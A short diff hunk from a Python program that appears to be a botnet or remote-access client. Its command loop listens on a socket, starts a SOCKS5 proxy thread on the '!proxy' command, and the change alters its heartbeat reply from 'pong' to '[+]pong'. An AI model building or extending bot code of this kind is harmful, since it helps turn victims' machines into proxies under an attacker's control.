@@ -297,7 +297,7 @@ def main():
                     elif c2.split()[0] == '!proxy':
                         thr(target=socks5geter).start()
                     elif c2.split()[0] == '[+]ping':
-                        s.send(b'pong')
+                        s.send(b'[+]pong')
                 except:
                     break
         except:
